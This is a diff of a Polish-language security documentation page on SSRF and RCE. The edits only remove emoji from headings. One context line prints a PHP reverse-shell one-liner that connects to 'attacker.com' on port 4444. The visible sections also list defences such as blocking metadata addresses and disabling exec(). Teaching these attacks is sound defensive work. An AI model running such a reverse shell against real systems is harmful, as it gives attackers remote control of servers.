@@ -1,17 +1,16 @@
 ---
 id: "ssrf-rce"
 title: "Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)"
-sidebar_label: "🚨 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)"
 sidebar_position: 13
 ---
 
-# 🚨 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)
+# Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)
 
 SSRF i RCE to jedne z najbardziej niebezpiecznych podatności w aplikacjach webowych. Pozwalają atakującym na wykonywanie nieautoryzowanych żądań wewnętrznych oraz zdalne wykonywanie kodu na serwerze.
 
 ---
 
-## 🔍 Server-Side Request Forgery (SSRF)
+##  Server-Side Request Forgery (SSRF)
 SSRF pozwala atakującemu na manipulowanie żądaniami HTTP wysyłanymi przez serwer. Może to prowadzić do ujawnienia wewnętrznych zasobów, eksfiltracji danych lub eskalacji ataku.
 
 ### **1️⃣ SSRF w chmurze**
@@ -103,7 +102,7 @@ php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ---
 
-## 🔐 Jak zabezpieczyć aplikację przed SSRF i RCE?
+##  Jak zabezpieczyć aplikację przed SSRF i RCE?
 ✅ **Blokowanie dostępu do adresów lokalnych (`127.0.0.1`, `169.254.169.254`)**
 ✅ **Walidacja i whitelisting URL w przypadku pobierania zasobów**
 ✅ **Wyłączanie niebezpiecznych funkcji w PHP (`exec()`, `system()`)**
